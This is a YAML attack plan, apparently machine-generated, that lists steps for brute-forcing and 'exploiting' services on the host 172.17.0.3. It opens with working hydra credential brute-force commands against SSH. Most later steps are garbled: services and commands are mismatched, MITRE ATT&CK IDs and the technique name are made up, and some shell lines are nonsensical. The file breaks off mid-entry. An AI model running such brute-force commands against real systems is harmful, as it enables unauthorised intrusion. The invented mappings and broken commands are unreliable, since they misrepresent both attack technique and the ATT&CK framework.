apt_name: Targeted Attack Chain for Vulnerable Services
description: Detailed attack plan to exploit exposed services on IP 172.17.0.3 targeting
  multiple protocols.
steps:
- command: hydra -L users.txt -P passwords.txt ssh://172.17.0.3
  description: Brute force FTP credentials to gain access to critical services.
  mitre_id: T1001.001
  mitre_name: Exploit Common Service Set (CSS)
  name: Exploit Common Service Set (CSS) on FTP
  service: ftp
- command: hydra -L users.txt -P passwords.txt ssh -e user@172.17.0.3 -p 22
  description: Brute force SSH credentials to gain access to critical services.
  mitre_id: T1002.001
  mitre_name: Exploit Common Service Set (CSS)
  name: Exploit Common Service Set (CSS) on SSH
  service: ssh
- command: telnet -zK -p 23 telnet 172.17.0.3 5900
  description: Exploit Telnet vulnerabilities using brute force to block access.
  mitre_id: T1003
  mitre_name: Exploit Common Service Set (CSS)
  name: Exploit Common Service Set (CSS) on Telnet
  service: telnet
- command: ssh -d -p 25 172.17.0.3 ssh -v
  description: Exploit SMTP vulnerabilities using brute force to block access.
  mitre_id: T1004
  mitre_name: Exploit Common Service Set (CSS)
  name: Exploit Common Service Set (CSS) on SMTP
  service: smth
- command: touch 172.17.0.3 | sudo -uexec bash -c "echo $PATH; echo 'touch 172.17.0.3'
    >> /proc/shell/bin/sh" -e bash -c "rm /proc/shell/bin/sh"
  description: Exploit exec vulnerability using brute force to access critical services.
  mitre_id: T1005
  mitre_name: Exploit Common Service Set (CSS)
  name: Exploit Common Service Set (CSS) on exec
  service: exec
- command: ftp -e "172.17.0.3 -P 21 2121" ftp -i 172.17.0.3:/var/lib/ftp/default -
  description: Exploit FTP vulnerability using brute force to access critical services.
  mitre_id: T1006
  mitre_name: Exploit Common Service Set (CSS)
  name: Exploit Common Service Set (CSS) on ftp
  service: ftp
- command: sshd -p 22 -e "echo 1; echo ' sshd -p 22 -e ' ssh -v 172.17.0.3 22" -e
    ssh -v 172.17.0.3 22
  description: Exploit SSH vulnerability using brute force to access critical services.
  mitre_id: T1007
